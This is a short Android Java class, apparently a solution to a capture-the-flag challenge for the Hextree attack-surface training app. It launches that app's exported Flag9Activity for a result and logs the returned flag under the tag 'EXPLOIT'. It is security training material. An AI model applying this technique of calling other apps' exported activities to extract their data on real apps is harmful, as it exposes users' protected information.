package com.android.zerohextree;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.android.zerohextree.databinding.ActivityHextreefalg9Binding;

public class Hextreefalg9 extends AppCompatActivity {


    private static final int REQUEST_CODE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create intent to launch Flag9Activity
        Intent flag9Intent = new Intent();
        flag9Intent.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag9Activity"
        ));

        // Start Flag9Activity FOR RESULT (to set the calling activity)
        startActivityForResult(flag9Intent, REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE && resultCode == -1) {
            // Extract the flag from the result intent
            String flag = data.getStringExtra("flag");
            Log.d("EXPLOIT", "Flag: " + flag);
        }
    }
}


